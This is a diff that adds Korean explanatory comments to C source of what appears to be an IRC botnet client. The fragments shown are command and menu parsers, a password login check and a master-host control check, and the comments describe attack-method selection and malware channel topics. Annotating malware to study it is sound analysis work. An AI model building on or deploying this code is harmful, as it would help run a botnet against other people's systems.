@@ -77,7 +77,7 @@ int wordcmp(const char *s, requests_t *req) {
     }
 
     return EXIT_FAILURE;
-}
+} // 어떤 메뉴를 사용할 건지 읽어들인다음 명령을 확인하여 명령이 올바른 값인지 아닌지 반환합니다.
 
 /* wordcmp(const char *, requests_t *) */
 /* a menu strncmp function.            */
@@ -87,14 +87,14 @@ int wordcmpp(const char *s, requests_t *req) {
     }
 
     return EXIT_FAILURE;
-}
+} // 어떤 공격 방법을 사용할 건지 읽어들인다음 명령을 확인하여 명령이 올바른 값인지 아닌지 반환합니다.
 
 /* twordcmp(const char *, requests_t *) */
 /* a topic strncmp function.            */
 int twordcmp(const char *s, requests_t *req) {
     if (strncmp(s, req->rcv_sb, strlen(s)) == true) return EXIT_SUCCESS;
     return EXIT_FAILURE;
-}
+} // 악성코드가 읽어들인 채널 topic이 올바른 값인지 확인하고 맞는지 아닌지를 반환한다. 
 
 /* login(sock_t *, requests_t *) */
 /* log in party-line bot.        */
@@ -110,7 +110,7 @@ int login(sock_t *sp, requests_t *req) {
     }
 
     return EXIT_FAILURE;
-}
+} // 입력한 비밀번호가 맞는지 판단하여 성공 실패 여부를 반환합니다.
 
 /* login_control(requests_t *)   */
 /* check if user is logged in.   */
@@ -118,7 +118,7 @@ int login_control(requests_t *req) {
     if (strstr(req->rcv_a, master_host)) return EXIT_SUCCESS;
     
     return EXIT_FAILURE;
-}
+} // 
 
 /* getextip(sock_t *, requests_t *) */
 /* get extern ip address.                */
@@ -260,7 +260,7 @@ unsigned short argn, unsigned short et) {
     }
 
     return EXIT_SUCCESS;
-}
+} // 에러
 
 /* create_irc_servlist()      */
 /* create a irc servers list. */
